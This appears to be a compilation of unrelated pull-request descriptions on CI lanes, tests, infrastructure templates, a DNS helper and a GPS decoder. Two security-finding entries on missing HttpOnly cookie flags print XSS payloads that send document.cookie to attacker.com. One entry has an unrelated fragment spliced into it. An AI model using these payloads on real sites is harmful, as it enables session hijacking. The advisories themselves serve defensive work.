author: cjohnstoniv
body:
## Summary

Closes #476.

`nightly.yml`'s `kind-sso-walk` job only ever ran the default Dex profile, and `scripts/compose-sso-roles.sh` never ran anywhere — ADO and compose role-map regressions were found only by hand. This adds two nightly jobs:

- **`kind-sso-ado-walk`** — its own kind cluster (`wardyn-ado` / `:8580`, `WARDYN_KIND_SSO_PROFILE=ado`), drives `scripts/kind-sso-walk.sh`'s Azure DevOps profile (`scripts/lib/kind-sso-walk-ado.sh`): the console signs in against a fake Entra tenant, the member's login captures their Azure DevOps credential, and their run redeems it (REST + `git ls-remote`) through the proxy's gate and broker.
- **`compose-sso-roles`** — drives `scripts/compose-sso-roles.sh` against both compose-shaped SSO deployments (`mprime`, `compose-sso`), hermetic and local, no kind cluster needed.

Both jobs use the same load-bearing check `kind-sso-walk` already uses: they assert the script's own closing `PASS` line rather than trusting a bare exit code, since an unset gate variable (`WARDYN_TEST_K8S` / `WARDYN_TEST_SSO_ROLES`) makes either script self-skip and exit 0 — a permanently green job that would prove nothing. Both are added to `notify-new-lanes`' `needs:` list, which `scripts/test-repo-guards.sh` enforces at lint time.

`docs/CI.md` gets an entry for each script under "Operator scripts that are deliberately not in CI", matching the existing entries for the other nightly-only lanes.

## Test plan

- [x] `scripts/test-repo-guards.sh` — PASS (nightly notification coverage guard, among others)
- [x] `make test-scripts` — PASS (all daemon-free shell regression tests)
- [x] `make lint` (fresh `GOLANGCI_LINT_CACHE`) — `go vet ./...` (all tag sets) clean, `golangci-lint` 0 issues, `check-file-size.sh` OK, `check-image-pins.sh` OK
- [x] `.github/workflows/nightly.yml` parses as valid YAML
- [x] Both new jobs ran green on a hosted runner: `gh workflow run nightly.yml --ref ci/476-nightly-ado-roles-matrix` → run [35839618622](https://github.com/cjohnstoniv/wardyn/actions/runs/35839618622) at f27c8938e. `kind-sso-ado-walk` success in 9m18s (log ends `kind-sso-walk (ado): PASS`); `compose-sso-roles` success in 2m40s (log ends `compose-sso-roles: PASS (mprime compose-sso)`, 9 passed per shape). Both PASS lines are in the uploaded artifacts. Results of the older lanes in that run don't count here; `kind-sso-walk` is already red on main.
- [x] Each job's assert step, run against the real uploaded log, a self-skip log and a log whose walk failed, exits 0, 1 and 1. So a self-skip or a failed walk turns the lane red.

Local-only note: `origin/main` currently fails `go vet` in `internal/api/ado_names_e2e_test.go` (PR #583, unmerged) — patched locally for gate runs only, reverted before commit; this PR does not touch that file.

author: tobocop2
body:
## Problem

`main` CI on macOS failed the coverage gate with every test passing. The rename-cancel test can press ctrl+r before the session drawer highlights a row. Then no rename starts, the test takes the plain close path, and it still passes. The rename-cancel lines go unrun.

## Solution

Both rename tests wait until the drawer highlights a row, start the rename and assert that it began. The cancel test also checks that the filter box leaves rename mode. With the race forced, the tests now fail instead of passing without a rename.

author: manishsirgg
body:
### Motivation
- Provide a lightweight, member-facing reporting workflow for Evo Circle discussions and replies while leaving admin/staff tooling for a future task. 
- Respect existing `content_reports` schema, RLS, and duplicate-report protections without adding migrations or service-role credentials. 
- Maintain UI/UX parity with current Circle actions and avoid per-reply N+1 queries when loading the current user's report state.

### Description
- Added a server `POST /api/circle/reports` route that derives the reporter from `supabase.auth.getUser()`, validates payloads with `validateCircleReport`, verifies published availability/ownership of discussion and reply targets, performs a pre-insert duplicate check, inserts only allowed fields, and treats Postgres `23505` unique-violation as an already-reported result. 
- Added a reusable client control `CircleReportControl` that opens an accessible modal dialog for reason selection and optional details, enforces `other` -> required details, trims/normalizes details to `NULL`, shows remaining characters (max 1,000), and redirects anonymous users to ` /auth/login?next=<path>`. 
- Introduced shared validation/types in `src/lib/circle-reporting.ts` (reason labels, max length, `validateCircleReport`) and mapped reported/own flags into the discussion conversation load in `getCircleDiscussionConversation` to fetch the signed-in member's relevant report rows in a single bounded query, avoiding per-reply queries. 
- UI integration: added a subtle `Report` action next to discussion actions and per-reply report actions (hidden for the current user's own content), added restrained dialog and control styling, and preserved the existing like/reply/share behavior.

### Testing
- Ran TypeScript checks with `npx tsc --noEmit` (passed). 
- Ran ESLint (`npm run lint`) and `git diff --check` (passed). 
- Executed focused Node assertion tests compiling `src/lib/circle-reporting.ts` and `src/lib/circle-validation.ts` and verifying validation rules for allowed reasons, trimming/null normalization, required `other` details, max-length rejection, invalid UUIDs, and invalid reasons (all assertions passed). 
- Confirmed duplicate-report handling logic maps `23505` to a reported/duplicate response in the route implementation. 
- Attempted `npm run build`; build was blocked by environment fetch failures for Google-hosted Geist/Geist Mono fonts (known environment limitation) and did not indicate regressions in the changed code. 
- Started dev server (`npm run dev`) and verified the application behavior up to environment-boundary responses; a live endpoint returned an expected Supabase-credentials error in this environment because project keys are not configured.

A second pass over the Claude Code configuration, at Ben's request, against Anthropic's 2026-09-22 prompting guide for the model this repository runs. ## Needs Ben

- **The plan-approval wait** (`CLAUDE.md` "plan mode first"; `/dev-session` step 6) is unchanged. The guide says to stop only when a step can't continue without you. - `.claude/rules/stops-and-reports.md`, loaded for every path. It covers four things:

author: eijikominami
body:
**analytics** -- declares the S3 Tables namespace the tables actually live in.

**cloudops** -- drops `SSMQuickSetupLifecycleAutomation`. It passed `AWS-RunPatchBaseline`, a Command document, to a property that takes an Automation document, so it failed on every attempt since 2026-08-10 and the resource never existed. Its failure rolled the whole CloudOps stack back, and the rollback then tried to restore the Resource Explorer index type, which is limited to one change per 86400 seconds -- leaving the stack stuck in `UPDATE_ROLLBACK_FAILED`. Patching is already covered by `SSMQuickSetupForPatchPolicy`.

**monitoring** -- counts SIEM log load failures with a log metric filter. Both alarms summed a metric through a SEARCH expression, which metric alarms reject because it returns more than one time series, and the underlying counts are emitted per logtype so no single metric covered a logtype that had not appeared yet.

**network** -- gives the egress VPC its own AZ2 subnet CIDRs and logs IKE and BGP activity on both VPN tunnels.

**identity** -- limits the general group to Quick and WorkSpaces, and defaults the AD subnets to the blocks shared already passes.

**shared / migration** -- continues the third availability zone's subnet sequence, and moves the staging VPC out of the egress VPC's range.

**web-servers** -- lets the instance own its network interface, and creates DLM images weekly rather than daily. The day is fixed at Monday inside the template rather than offered as a parameter, since a weekly image has no reason to be scheduled per stack.

**euc** -- adds a third availability zone. `MicrosoftAD` decides whether to build its own third AZ from whether `SubnetPrivateIdForAz3` is empty, and euc -- a two-AZ template -- never passed it, so enabling the directory would have had the child create a subnet from ITS default, which lives in 10.3.x and is outside euc's 10.2.8.0/21. The subnets had to shrink to make room: that /21 holds eight /24-sized groups and the two existing AZs used all eight, while the VPC cannot grow because 10.2.8.0/20 is not a valid boundary and 10.2.0.0/20 would swallow the WebServers VPC at 10.2.0.0/21. Each AZ now takes two groups -- private /24, public /25, transit /25 -- and three fit in six.

**security / cicd / notification** -- raises the SIEM ingestion alarm from the audit account and shares that alarm application with the other accounts, and stops `DescribeAlarms` being called on every log event.

**docs** -- matches the parameter tables to the declarations. Twelve rows named a parameter no template declares, so a reader copying one gets a stack that will not start: `RealtimeDashboardKinesisNumberOfPutRecordThreshold` is `RealtimeKinesisNumberOfPutRecordThreshold`, `InputVodSourceBucket` is `VodSourceBucket`, `OutputRtmpStreamName1` and `2` are `OutputRtmpStreamKey1` and `2`, and web-servers renamed its three transit subnet blocks out of the `ForAz` form that network still uses. Eight defaults disagreed with their declaration -- `FSxThroughput` has no `Default:` at all, so the `8` in its column was the first entry of `AllowedValues` and told the reader a required parameter could be omitted. Four allowed-value sets were wrong: `WebServers` takes `INSTANCE`, `CONTAINER` or `DISABLED`, `IpAddressType` takes `DUAL_STACK` rather than `IPV6`, and CloudOps offered `INCIDENT_MANAGER_DISABLED`, which now fails validation.

**Tested**

- `cfn-lint` on every changed template, with the count compared before and after so no new finding was introduced. The two pre-existing findings in static-website-hosting and the five in web-servers are unchanged.
- The parameter audit re-run after the documentation fixes, confirming the corrected rows no longer appear.
- The squash verified by tree hash: the tree at the single commit is identical to the tree before the history was rewritten, so no content changed in the rewrite.
- CloudOps has not been deployed from this branch. The stack is still in `UPDATE_ROLLBACK_FAILED` from the resource this pull request removes, and it has to be recovered after the merge, not before.

**Not included**

Three classes of documentation defect need a decision rather than a correction and are left alone: parameters two templates in the same category declare differently, rows no declaration backs at all, and declarations no row mentions.

By submitting this pull request, I confirm that you can use, modify, copy, and redistribute this contribution, under the terms of your choice.

body:
## Summary

メニュー編集画面で、オプションの**最下行の「↓」・最上行の「↑」が押せてしまい**、押すと `itemOptionCheckbox` に穴が空いて編集画面が丸ごと描けなくなる（SingularitySociety/omochikaeri-docs#188）。

守りが `<button>` ではなく内側の `<div>` に付いていたため、端の行でも中身の無いボタンが残っていた。見えないだけで tab 順には居るので Enter で押せる。

issue に挙がっていた2案を**両方**入れた。押せないようにするのと、規則そのものを守らせるのは別の話なので。

1. `v-if` を `<button>` 側へ移す — 端の行のボタンが DOM から消える
2. 入れ替えを `optionMovedUp` / `optionMovedDown` として `src/utils/optionRows.ts` に切り出し、端と範囲外を弾く — 別の入口から同じ間違いが入っても止まる

`positionUp` / `positionDown` はその関数を呼ぶだけになった。

## Items to Confirm / Review

- **範囲内の入れ替えが今まで通りか。** 直す前の実装をそのまま写した台に、生成した入力を流して突き合わせた（`optionMovedUp` / `optionMovedDown` と旧実装、端・範囲外を除いた全ての位置）。範囲内は全件一致、穴と長さ変化は旧実装だけに出て新実装には出ない。
- **端の行のボタンが本当に消えて、見た目がずれないか。** 出荷する markup を SFC から抜き出して browser で測った。旧 markup では端の行に大きさ0の focusable なボタンが残り、Enter で `positionUp(0)` / `positionDown(最終行)` が発火する。新 markup では発火しない。入力欄の左位置・幅・行の高さは3行とも前後で同一。
- **`swapped` の引数の順を入れ替える変異はテストが赤にならない。** `swapped` が対称なので本当に無動作で、テストの穴ではない。残り5つの変異は赤になる。
- **`v-if` の位置は `test/unit/test_optionArrows.ts` で押さえた（レビュー中に追加）。** `MenuItemPage.vue` を解析して、`positionUp` / `positionDown` を呼ぶボタンが**それぞれ1つだけ**で、**そのボタン自身**が `key !== 0` / `key !== menuInfo.itemOptionCheckbox.length - 1` を**丸ごと一致で**持つことを見る。字面の一部だけを見る版は、守りを反転させた式（`key === ...length - 1`）で突破できることが分かったので、通る形を1つに決める書き方に変えた。`key` を `index` に改名するような安全な書き換えも赤になるが、それは承知のうえ。
- ドラッグでの並べ替え（#179）には触れていない。あちらは `vuedraggable` が配列を作り直すのでこの穴は空かない。

## User Prompt

> 179の続きやって 188 187も順次やる

> （直し方2案のどちらにするか、に対して）両方

## 動作確認

- [ ] 最下行で tab して Enter を押しても、オプションが増えない
- [ ] 最上行で同じことをしても増えない
- [ ] 真ん中の行の ↑↓ は今まで通り動く
- [ ] オプションが1つだけのときに壊れない

## Summary by Sourcery

Prevent menu editor crashes by removing unusable boundary arrow buttons and making option reordering reject invalid moves.

Bug Fixes:
- Prevent option-row arrow actions at the list boundaries and out-of-range indices from corrupting the option list and crashing the menu editor.

Enhancements:
- Move option-row reordering rules into reusable utilities that safely preserve valid lists and leave invalid moves unchanged.

Tests:
- Add coverage for safe option movement, boundary and invalid indices, single-option lists, nullish inputs, immutability, and guarded arrow-button markup.

author: yogeshprasad098
body:
## Target and outcome

Closes #1123

While a model streams, and in each turn result, Falryn now reports a labelled generation rate per provider request stream. Estimates, live values, partial streams and short samples are named in words. Tool, confirmation, hook and retry time never count as generation time, and reading the details makes no provider call.

## Primary change class

- [x] Feature
- [ ] Bug fix
- [ ] Documentation only
- [ ] Infrastructure or dependency update
- [ ] Research or qualification
- [ ] Refactor or maintenance

## Compatibility

- [ ] Breaking change (also apply the `breaking-change` label)
- [x] Backward compatible or not applicable

`model.attempt.completed` gains an optional versioned `generation` field. Older records parse unchanged and project as `unavailable`. The replay command payload gains a `generation` list.

## Delivery identity

- Delivery owner: #1123

## Scope

- `src/domain/sessions/generation-timing.ts` owns the fact, its schema and the pure rules: provider-reported usage first, then an estimate over received text, then `unknown`. It also owns the 250 ms and 8-token sample floor, the backwards-clock `unavailable` rule and the two-second live window.
- `src/application/providers/generation-timing.ts` has the recorder, the `timeProviderStream` tap and a per-executor activity. The runner creates one recorder per provider request.
- `turn-attempt-policy.ts` writes the final facts onto `model.attempt.completed`. The live turn executor exposes `generation` and returns the facts in its result.
- `falryn run` lists each entry in human and JSON output, JSONL carries the event, `falryn replay` shows stored facts, and TUI transcript expansion shows the detail. The status line shows a fixed-width label such as `48 tok/s est. live` or `40 tok/s`.

Three corrections to the handoff, each forced by source evidence:

1. **Timing is read where events leave the adapter, not in the consumer.** `recordProviderHistory` holds text deltas in batches (up to 32 events or 16 KiB) until they are durable, and only then passes them to the consumer. Consumer-side timestamps reported a short answer as arriving all at once at its end. The tap sits before history capture and before the consumer's queue, so neither batching nor coalescing can change a recorded time or count. The provider stream consumer itself is unchanged.
2. **The timing unit is one provider request stream.** A model attempt can issue several requests around tool calls. A turn with a tool call in the middle therefore reports two entries, which is what the completion proof describes.
3. **Cancelled attempts now keep their receipt.** The policy wrote `model.attempt.completed` with the already-aborted turn signal, so a cancelled attempt left no completion record at all and its partial fact was lost. The receipt now gets a bounded 30-second settlement signal, the same rule history and processing receipts already follow. The recorder's `finish` is idempotent, so the runner's output settles a still-running stream as `partial` and a late completion can't rewrite it.

Export redaction treats any key containing "token" as a secret name. A fully parsed timing fact now keeps `tokens` and `tokensPerSecond`, while its identity strings still go through the text rules. Look-alike objects get no exemption.

## Validation

- [x] Focused tests and relevant negative cases pass.
- [x] `bun run check` passes, or the limitation is recorded.
- [x] `bun run build` passes when packaging or runtime composition changed.

Commands at `7a1bd3f`:

- `bun run check`: static gates clean. The first full run hit one registry assertion (`tui-boundaries.test.ts` lists every harness consumer). I added the new test file there, and that file then passed 51/51. The other 6,317 tests passed, with 16 skipped.
- `bun run build`, then `./dist/falryn --version`: compiled build, bun 1.4.1, darwin arm64.
- `bun run smoke:macos-arm64`: 42 pass.

New tests follow the completion proof:

- `product-generation-timing.test.ts` drives the real live executor with a manual clock. It covers:
  - live and final rates agreeing (40 tok/s, estimate vs provider-reported), with updates at least 250 ms apart
  - wire round trip and replay without a provider call
  - estimate and `unknown`
  - tool execution (5 s) and confirmation (7 s) between two streams, excluded from both
  - cancellation as `partial`, persisted
  - retry after a rate limit as separate attempts
  - a parent and two concurrent children with separate rates and totals
- `provider-stream-consumer.test.ts`: coalescing below the tap leaves timing identical.
- `generation-status.test.tsx`: the real shell shows `Generating    48 tok/s est. live` while a stream is paused before history publishes it, then `Last    40 tok/s`.
- `coding-run.test.ts`: `falryn run` payload, JSON and human output, the SQLite round trip, and `falryn replay` in JSON and human.
- Domain, recorder, label-width, transcript, row and export redaction unit tests.

## Documentation

- Documentation impact: public-code-adjacent-update, private-update-required
- Companion documentation PR or reason none: tyldra-org/falryn-docs#473 (merges first)

- [x] `CURRENT-STATE.md` reflects only behavior supported by this change.
- [x] Affected public documentation owners were updated or verified unaffected.
- [x] Any private update or unavailable verification is identified without exposing private content.
- [x] Required application and documentation pull requests use reciprocal links and the same delivery owner.
- [x] Public claims are source-verified; no roadmap, unannounced capability, private research, or internal design was added.
- [x] Existing public documentation was updated instead of creating a duplicate owner.
- [x] Repository-qualified paths and GitHub links are shareable; no private or contributor-specific local path is persisted.

## Risk and limitations

- `ClockPort` is wall-clock based. A reading that goes backwards makes that stream's rate `unavailable` rather than wrong.
- Adapters normalize output tokens differently: Gemini excludes thought tokens, OpenAI includes reasoning tokens. The fact keeps the adapter's value and reports reasoning separately. It never subtracts to derive text tokens.
- The status line drops the generation text first on narrow terminals. Streaming-block footers (#740) and agent task-tree rows (#161) will render the same projection when they land. A delegated child's facts are in its own session events and executor today.
- On cancellation, the attempt receipt write may now wait up to 30 seconds on a slow store instead of being skipped.

## Delivery checklist

author: gunterlie
body:
# Pull request

## Linked issue

Closes #1039

## Why this change

Slurp2 pictures ignored their posts: the image-prompt rewrite could return nothing on reasoning models, the fallback cut the scene off, card descriptions and costumes leaked into prompts, and illustrated styles could render Creators too young. Posts, DMs, and the story engine had related problems: contradicting prompt blocks, occasions and story facts that never reached a prompt, broken follow-ups, and background jobs starving player DMs of the model budget.

## What changed

- Package: `slurp2` remains at 0.2.26 as requested (manifest, client/server bundles, artifacts, catalog entries rebuilt from source).
- Images: self-contained appearance is resolved from a Creator override, linked Appearance, or a cached LLM extraction from card details; avatar references are sent only to supported providers. Prompt built from the post model's English scene; clothing, costume, and age-coding words removed from the look; adult anchor and adult-only negatives on every image path; rewrite uses Slurp's connection; new Image style setting; auth errors not retried.
- Prompts: resolved level for locked posts, capped card fields with resolved macros, format length ceilings, language rules, separate prompt IDs.
- Story engine: occurrences, facts, and arc opportunities reach generation; influences drive reply delay and audience activity; manual occasions can be started.
- Messages/systems: follow-up crashes, busy detection across the Engine boundary, DM budget reserve, owned-post upsells, payment chips, "budget" reply status, audience activity feedback.
- Removed outdated Slurp planning and review Markdown files and their references.

## Package and security impact

- Affected package IDs: `slurp2`
- Engine compatibility impact: none (same Engine range)
- New or changed permissions/entrypoints: new routes `GET /slurp/image-style-profiles` and `POST /slurp/accounts/:id/appearance`; no new package permissions
- Restart, storage, update, or uninstall impact: new settings `imageStyleProfileId` and `appearanceProfileMode`, optional cached appearance on account settings, and executable client/server bundles changed. The artifact was rebuilt under the existing 0.2.26 version, so version-based update detection will not offer it as a new release.

## Validation

- [ ] `node scripts/validate-catalog.mjs` passes locally
- [ ] `git diff --check` passes locally
- [ ] Rebuilt every affected manifest, payload, artifact, and catalog entry
- [ ] Installed or updated the affected package through Marinara Engine
- [ ] Checked supported modes, restart behavior, and uninstall cleanup
- [ ] Read and followed `CONTRIBUTING.md`

### Manual verification notes

- Appearance, Creator stage facts, image prompt boundaries, persona Creator, and Backstage regressions pass (16 tests). `npm run check`, Slurp2 architecture/typecheck, catalog lanes, locales, catalog validation, and release notes validation pass. The pre-existing `slurp2-image-context.regression.ts` VM harness still fails because it omits `slurpIsLegacyImageBrief` from its context.
- Manual Engine install and picture generation were not performed. Verify first-image extraction, review actions, and provider prompts with interpretation on and off before merge.

## Documentation impact

- [ ] No documentation changes needed
- [ ] Updated this README catalog and package guidance
- [ ] Updated linked Marinara Engine documentation

author: raydocs
body:
## 归属门

SHIP_PLAN G1（断开与恢复）。R3-F4（2026-09-22 并发/时序审查 + 对抗核实轮 V7，已确认低危）。

## 根因

受保护期间快照存在（如 `service="Wi-Fi"`），但用户重命名/删除了该网络服务、或 `networksetup -getdnsservers` 非零返回时，helper `ProtectedDNSManager.status()` 中 `currentDNS(for: snapshot.service)` 抛错，catch 分支把状态折叠成 `ok:false, snapshotPresent:false` 并丢掉 service 键。App 侧 `HelperManager.restoreProtectedDNSIfConfigured` 的 `guard envelope.ok == true || snapshotPresent`（HelperManager.swift:726）随之失败，POST `/dns/restore` 从未发出——而 `restore()`/`restoreServices` 对快照服务缺失有明确处理（跳过快照服务、把现名服务上的 127.0.0.1 清为 Empty），本可成功。影响：Disconnect 被无谓拒绝（有界：用户可改回服务名或 emergency-disarm），无泄漏。

## 修复（仅 helper 侧，最小正确面）

`status()` 现在区分两种失败：

- `loadSnapshot()` 失败 → 仍报 `ok:false, snapshotPresent:false`（快照不可信，属 R3-F3 后续修复范围，本 PR 不触碰）；
- 快照已加载但当前服务不可读 → 改报 `ok:false, snapshotPresent:true` 并携带 `service`，读回失败信息单独携带（既有字段语义不变）。

App 侧 `ok == true || snapshotPresent` 门无需改动即转调 `/dns/restore`（verify-V7 §5 的结论）；本 PR 未改 HelperManager。按 `restoreServices` 的注入模式把状态决策提取为静态事务 `statusResponse(snapshot:read:)`，生产 `status()` 仍用真实 `loadSnapshot`/`currentDNS`，行为面不变（`response` 辅助函数改为 static 以复用）。

副作用核对：`UpdateRuntime.observe()` 先守卫 `resolver["ok"] == true`，本分支对它仍返回 `.unknown`，不变；App 的 `allowSystemResolution` 要求 `!snapshotPresent`，真值上报只会更收紧，不放宽。

## 测试与失败机理

新增 helper 自测 `runStatusUnreadableServiceSelfTest`（载体 `--lifecycle-self-test`，与既有 `runRestoreReadFailureSelfTest` 同入口）：有效快照（service=Wi-Fi）+ 注入 `currentDNS` 抛错 → 断言 `snapshotPresent == true`、`ok == false`、`configured == false`、`service == "Wi-Fi"`。修复前实现把该状态报成 `snapshotPresent:false`（且无 service 键），用例必失败；不触碰任何真实 DNS 偏好或根快照。

## 验证状态

- 源码 SHA：`9f175b4c`（分支 `fix/macos-dns-status-snapshot-20260922`，基于 main `576d7087`）。
- 本机为编辑/审查机（2026-09-14 所有者决定）：未在本机执行 swift 编译/测试（xcodebuild/swift build/swiftc 均未运行），仅编辑与读码自查。
- 回归委托本 PR CI：GitHub-hosted macos-26，`tooling/scripts/**` 触发 macos-ci，其中 `sudo … --lifecycle-self-test` 覆盖新用例。提交本 PR 时尚未获得 CI 结果，不沿用其他分支证据。

## 不放宽保护

`restore()`/`restoreServices` 的读回验证语义不变；M2 的"读取错误不假装恢复"不变；`loadSnapshot` 的安全校验与失败语义不变（留给 R3-F3 后续 PR）；App 侧 guard 未动。本修复只修"状态折叠导致根本不去尝试恢复"。

## Changelog

`docs/INTERNAL_CHANGELOG.md` 已在同一 commit 顶部新增 2026-09-22 条目（归属 G1，无新包仅源码）。

body:
Requested by Joel on 2026-09-23 — "Close out, create your pool requests and then have the other agents do the same."

## What changed

Charter drafts, which Joel approves. No code.

**TEC-15, the grocery list moves to Cookbook** (sequence approved by Joel, 2026-09-23: "Sequence approved"):
- `health/RULES.md`: the list is leaving. First `/list` redirects to Cookbook and Health stops touching `health.grocery_items`; then the table is dropped once that is live. **The second-screen rule stays**: it was written about the list but isn't about it.
- `cookbook/RULES.md`: the sequence, with Cookbook's part first, because the list needs a URL of its own for Health's redirect.
- `SURFACE.md`: the grocery list is Health's precedent, no longer its screen.

**TEC-11, the Health↔Cookbook read contract** (Joel, 2026-09-23: "Option a it is for 11"). **It lives once, in Cookbook's charter**, and Health's charter points to it:
- **`GET /api/servings`** returns every recipe per serving. Cookbook does the division, because the table stores the whole pot. **Additive only.**
- **Authentication forwards the caller's `paddock_session`** to a fixed `COOKBOOK_BASE_URL`, never a URL taken from the request. I checked this against `apps/cookbook/middleware.ts`: any valid session passes, so **there's no carve-out, the password gate stays three variants, and `CLAUDE.md` doesn't change.**
- A failed read shows as "couldn't reach the Cookbook", never "not found".
- A `DECISIONS.md` entry records why reading Cookbook's tables directly and a secret-based carve-out were both rejected.

## Why

Both are cross-app and the TD's to sequence and design. They're on one branch because they edit the same charter sections for the same approval; two branches would conflict under squash merge. Both `grocery_items` tables held **0 rows** on 2026-09-23, so nothing needs copying.

The build work is in Linear, each issue ending with Next steps: TEC-22 (Cookbook, the list URL), TEC-23 (Health, redirect and stop using the table), TEC-24 (Cookbook, `/api/servings`), TEC-25 (Health, the call). **None of them starts until this merges.**

## Blast radius

`.claude/agents/health/RULES.md`, `.claude/agents/cookbook/RULES.md`, `.claude/SURFACE.md`, `.claude/DECISIONS.md`. No app code, no shared files.

## Verification
- [x] No app code, so no tests or builds are affected. CI is green on `ccf6814`.
- [x] drift is clean. `DECISIONS.md` is at 394 of 400 and `SURFACE.md` at 111 of 120, both in their warn bands.
- [x] No personal information anywhere in the diff.
- [x] `HANDOFF.md`: no TD handoff line became untrue. The state lives in Linear on TEC-11 and TEC-15. Health's and Cookbook's handoffs are theirs to update when they build.
- [x] No schema change. The drop of `health.grocery_items` is a later, separate pull request.

## Deployment

- **On merge:** only the hub rebuilds, because of `.claude`. No app behaviour changes.
- **Human steps:** none.
- **Verify:** it's documentation only. What it enables is TEC-22 and TEC-24 becoming startable.
- **If skipped:** Cookbook and Health would build against unapproved charters.

## Brief impact

This edits two other agents' charters and `SURFACE.md`. Since 2026-09-20 the TD drafts charters and Joel approves them, so this pull request *is* the approval request. It supersedes Cookbook's charter line "Surface is settled… TEC-11 and TEC-15 are not yours" only as far as those two issues now have Cookbook parts.

body:
### CodeMender Security Fix

**Finding ID**: `9794006a-377c-578f-81b9-4c9f29be60cc`
**Title**: Authentication Cookie Set Without HttpOnly or Secure Flags
**Severity**: MEDIUM
**Vulnerability Type**: Insecure Cookie Configuration
**File Path**: `lib/insecurity.ts`
**Start Line**: 192

#### Analysis
The authentication cookie `token` is set via Express `res.cookie('token', token)` without specifying security flags such as `httpOnly: true`, `secure: true`, or `sameSite`.

Data Path & Impact:
- Source: Incoming request JWT authentication token via `req.cookies.token` or `utils.jwtFrom(req)` (Authorization header).
- Sanitization/Validation: None. No options object specifying security attributes (`httpOnly: true`, `secure: true`, `sameSite: 'lax'/'strict'`) is provided to `res.cookie`.
- Sink: `res.cookie('token', token)` in `lib/insecurity.ts:192`.
- Reachability & Impact: Any request containing a valid JWT in the Authorization header or cookie triggers `updateAuthenticatedUsers` middleware, which issues or refreshes the `token` cookie in the HTTP response. Without `httpOnly: true`, client-side JavaScript (e.g. from any Cross-Site Scripting vulnerability in the application) can read `document.cookie` and exfiltrate the JWT bearer token, allowing full session hijacking. Furthermore, without the `secure` flag, the cookie can be transmitted over unencrypted HTTP connections.

Conceptual Exploit Payload:
In an XSS injection payload on any page within the application domain:
```javascript
<script>
  fetch('https://attacker.com/steal?cookie=' + encodeURIComponent(document.cookie));
</script>
```
Because the `token` cookie is created without `HttpOnly`, `document.cookie` contains the user's active authentication token, which is transmitted directly to the attacker.

---

author: jbschooley
body:
Fixes #5373

The Queclink GV50M series (GV50M / GV50MG, protocol version prefix `FE`) sends `+RESP:GTFRI` with this layout after the cell fields, per the [GV50M Series @Track Air Interface Protocol V17.12](https://github.com/traccar/traccar/files/7629509/GV50M.Series.%40Track.Air.Interface.Protocol_V17.12.pdf) (uploaded to #4776), section "+RESP:GTFRI":

```
Reserved, Mileage, Hour Meter Count, Battery Percentage, Device Status, Reserved, Reserved, Send Time, Count Number
```

There are no ADC fields after the hour meter and no RPM / fuel fields after device status. Sample from a live GV50MG:

```
+RESP:GTFRI,FE1712,015700000310332,,11308,10,1,1,0.0,0,1393.0,-111.891047,40.760780,20260922234154,0310,0410,4E20,0B4F2A01,,129297.4,02792:32:17,68,110000,,,20260922234153,F646$
```

On current master the generic path reads the battery percentage as ADC1 and device status as ADC2, then tries to parse the send time as fuel level and throws `NumberFormatException: For input string: "20260922234153"`, so the whole report is dropped (the added test fails this way without the decoder change). External Power VCC (`11308` mV) is lost with it.

Commits:
1. Map protocol prefix `FE` to `GV50M`, skip the ADC and RPM / fuel fields for `GV50M*` in `decodeFri`, and add the sample above as a test verifying `power` = 11.308.
2. Treat an empty device model string like no model, so the protocol version prefix is used for detection. My device had been saved with an empty model, which made the declared model `""` and bypassed the prefix lookup entirely.

`GTINF` from the same device already decodes correctly and is unchanged.

body:
### CodeMender Security Fix

**Finding ID**: `7d174d08-2b31-50ce-85f0-9649145ce1d4`
**Title**: Sensitive Authentication Cookie Set Without HttpOnly and Secure Flags in updateUserProfile
**Severity**: MEDIUM
**Vulnerability Type**: Insecure Storage / Sensitive Cookie Without Complete Flags
**File Path**: `routes/updateUserProfile.ts`
**Start Line**: 42

#### Analysis
Data-flow and verification analysis:
- Source: An authenticated user issues an HTTP POST request to `/profile` with a valid session cookie and `username` in the request body.
- Flow: In `routes/updateUserProfile.ts`, the user's profile is updated with the new username, and a new JWT token (`updatedToken`) representing the updated session is generated via `security.authorize(userWithStatus)`.
- Sink: At line 42, `res.cookie('token', updatedToken)` is invoked to set the new authentication token in the user's browser without specifying security options (`httpOnly: true`, `secure: true`, or `sameSite`).
- Impact: Because the `HttpOnly` flag is missing, the sensitive JWT authentication token is accessible to client-side scripts via `document.cookie`, allowing attackers to steal session tokens via Cross-Site Scripting (XSS). In addition, the lack of the `Secure` flag permits the cookie to be transmitted over unencrypted HTTP connections.

Conceptual Exploit:
1. An attacker places an XSS payload or leverages an existing XSS vulnerability in the application.
2. A logged-in user sends a request to update their profile:
   POST /profile HTTP/1.1
   Host: target.app
   Cookie: token=<valid_session_jwt>
   Content-Type: application/x-www-form-urlencoded

   username=victim_user
3. The server responds with:
   HTTP/1.1 302 Found
   Set-Cookie: token=<new_session_jwt>; Path=/
   Location: /profile
4. The XSS script reads `document.cookie` (since `HttpOnly` was not set) and exfiltrates the user's new authentication token to an attacker-controlled server:
   <script>new Image().src='https://attacker.com/steal?token=' + encodeURIComponent(document.cookie);</script>

---

author: gregorydemay
body:
`process_deposit` checks that the caller attached at least `process_deposit_required_cycles`, then charges the cycles attached to the `getTransaction` call minus the refund plus, on success, the consolidation fee. If the two parameters are ever configured so that the required amount is below that sum, the charge asserts inside the reply callback; a trap there skips destructors, so the per-account guard is never released and the account stays blocked until the next upgrade.

This adds the constraint `process_deposit_required_cycles >= GET_TRANSACTION_CYCLES + deposit_consolidation_fee` to the state validation run on init and upgrade, documents it in section 3.3.4 of the design, and pins the boundary with a test that charges exactly the required amount with no refund. The current defaults and the staging minter's history satisfy it with a wide margin; since validation also runs when the event log is replayed, the design note says that raising the cycles budget constant requires checking deployment histories first.

Found during the review of #211, where `deposit_sol` would have added a second consumer of the same parameters.

body: ### ✨ What changed - The controller tracks every provider attempt that inserted a pending row. - On a caller disconnect, attempts other than the last one are set to `cancelled`. - New `cancelPendingProviderAttempts()` only updates rows still `pending`. ### 💭 Why A disconnect during the fallback chain throws out of the chain before its local failure list reaches a writer. `recordCancelledRequest` only completed the last attempt, so the failed primary, earlier hops and any Autofix retry stayed `pending` in `agent_messages` forever. ### 📝 Notes - Leftover attempts get `cancelled` with no error fields, per `docs/glossary.md` ("active rows transition to cancelled"). The controller does not have their error bodies. A terminal write that lands later still wins, because the cancel is guarded on `status = 'pending'` and the other writers update by id. - Found by a TLA+ model of the proxy lifecycle (invariant `NoOrphanAttempts`). - Non-abort paths are unchanged. --- ## Summary by cubic Fixes a bug where a caller disconnect in the middle of the fallback chain left earlier provider attempts stuck as `pending` in `agent_messages` forever. Now every pending attempt, including the last one, is cancelled on 